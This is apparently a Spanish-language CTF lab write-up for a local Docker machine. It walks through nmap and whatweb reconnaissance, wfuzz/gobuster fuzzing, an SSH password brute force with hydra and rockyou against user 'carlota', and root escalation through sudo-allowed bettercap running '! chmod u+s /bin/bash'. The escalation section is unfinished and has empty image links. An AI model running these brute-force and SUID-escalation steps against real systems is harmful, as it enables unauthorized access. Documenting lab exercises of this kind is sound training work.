
> Habilidades: Enumeración, steganografía, escalada de privilegios (linux)


# RECONOCIMIENTO

## Nmap Scan

Realizamos el primer sondeo a la ip de la victimma para averiguar que puertos están abiertos:

~~~ bash
nmap --open -p- -n -sS -Pn $ip -oG FirsScan
~~~

![Primer_Escaneo](https://i.imgur.com/NssolyM.png)

- `--open`: Nos muestre los puertos abiertos.
- `-p-`: Escanear todo el rango de puertos (65535)
- `-sS`: Escaneo TCP SYN, técnica más sigilosa para determinar el estado del puerto.
- `-n`: No aplicar resolución DNS.
- `-Pn`: Deshabilitar el descubrimiento de host, asumiendo que el objetivo se encuentra activo.
- `-oG`: Exportar el escaneo a un formato `Grepable`, util para extraer información.

_____________________________________________________________________________________________________________________________

### ENUMERAR SERVICIOS
Realizamos enumaeración a los puertos abiertos.
~~~ bash
nmap -sVC -p 22,80 172.17.0.2 -oN ServicesScan
~~~

![Escaneo_Sevicios](https://i.imgur.com/6ybGn1A.png)
- `-sC`: Ejecuta scripts NSE (Nmap Scripting Engine) predeterminados.
- `-sV`: Detecta la versión del servicio que se está ejecutando en cada puerto abierto.
_____________________________________________________________________________________________________________________________

## Http Service

Vemos el puerto `80` que corresponde a un servicio `http`, veamos que hay en él. Podemos usar la herramienta `whatweb` para listar las tecnologías detectadas en el servidor. (Como alternativa, puedes usar la extension de navegador Wappalyzer)

~~~ bash
whatweb http://172.17.0.2
~~~

![whatweb](https://i.imgur.com/iz3f6TK.png)

Abrimos en navegador y vamos a dicha web, leemos y podemos ver algo interesante, una nota de `Carlota`.
Yo siempre reviso view-source de la web por si se me escapa algo interesante. Siempre hay que enumerar todo lo que se pueda.
![despido](https://i.imgur.com/JTVpkU4.png)

_____________________________________________________________________________________________________________________________

## Fuzzing

El siguiente paso será intentar descubrir posibles directorios, podemos usar cualquier herramienta de fuzzing, yo usaré `wfuzz` y `gobuster`

### Wfuzz
~~~ bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://172.17.0.2/FUZZ
~~~

![wfuzz](https://i.imgur.com/GEns8Jg.png)

- `-c`: Formato colorizado
- `--hc=404`: Ocultar el código de estado 404 (Not Found)
- `-w`: Especificar un diccionario de palabras
- `-t 200`: Dividir el proceso en 200 hilos, agilizando la tarea


### Gobuster

~~~ bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
~~~

![gobuster](https://i.imgur.com/qsO45ms.png)

- `dir`: Modo de descubrimiento de directorios y archivos
- `-u`: Dirección URL
- `-w`: Diccionario a usar
- `-t 200`: Establecer 200 subprocesos 

Podemos ver que en ambos casos no se ha descubierto ningun directorio. :(
_____________________________________________________________________________________________________________________________

## Fuerza Bruta

Como obtuvimos dos nombres anteriormente, vamos a intenta hacer fuerza bruta con uno de ellos.
~~~ bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
~~~

![hydra](https://i.imgur.com/gHUFhTq.png)


- `-l`: Especificar un nombre.
- `-P`: Especificar una lista de palabras.
- `-t4`: Especificar hilos a usar. (más rapido)
- `ssh`: Especifica el protocolo.

¡¡BINGO!! obtuvimos las credenciales de Carlota.

## Escalada de privilegios



# Escalada de privilegios


Una vez tenemos acceso, tratamos la TTY para poder usarla comodamente, para esto cambiaremos el valor de la variable `$TERM`

~~~ bash
> control Z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty size
stty rows 44 columns 184


~~~

***UNDER CONSTRUCTION***


## Sudoers

Primeramente veremos si tenemos privilegios `sudo` con el siguiente comando

~~~ bash
sudo -l
~~~

![sudo -l]()

- `-l`: Enumerar los comandos permitidos (o prohibidos) invocables por el usuario en la máquina actual

![exec bettercap with sudo]()

Veamos el panel de ayuda con el comando `help`


## SUID Privilege Escalation

Esta opción (`!`) nos permite ejecutar un comando a nivel de sistema, así que podemos asignar el privilegio SUID a la `bash` para ejecutarla como `root`, para eso, lo haremos con el comando `chmod`, dentro de la consola interactiva de `bettercap` ejecutamos el siguiente comando

~~~ bash
! chmod u+s /bin/bash
~~~


- `-eval`: Ejecutar un comando en la máquina





